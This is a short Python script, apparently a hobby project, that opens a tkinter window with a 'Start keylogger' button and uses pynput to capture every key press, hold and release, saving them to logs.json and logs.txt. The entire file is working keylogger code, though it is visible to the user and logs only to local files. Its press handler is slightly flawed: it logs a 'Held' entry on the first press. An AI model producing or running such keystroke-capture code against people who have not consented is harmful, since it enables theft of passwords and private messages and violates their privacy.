import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("350x250")
root.title("Keylogger Page")
root.configure(bg="lightblue")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt','w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json','wb+') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed' : f'{key}'}
        )
        x = True
    if x == True:
        key_list.append(
            {'Held':f'{key}'}
        )
    update_json_file(key_list)


def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
    )
    if x == True:
        x = False
    update_json_file(key_list)
    
    key_strokes = key_strokes+str(key)
    update_txt_file(str(key_strokes))

def butaction():
    print("[+] Running key logger successfully! \n [!] Saving the keylogs in 'logs.json'")

    with keyboard.Listener(
        on_press = on_press,
        on_release = on_release) as listener: 
        listener.join()
    
    

empty = Label(root, text='Keylogger project', font='Verdana 11 bold').grid(row=0, column=0)

Button(root, text='Start keylogger', command=butaction).grid(row=1, column=0)



root.mainloop()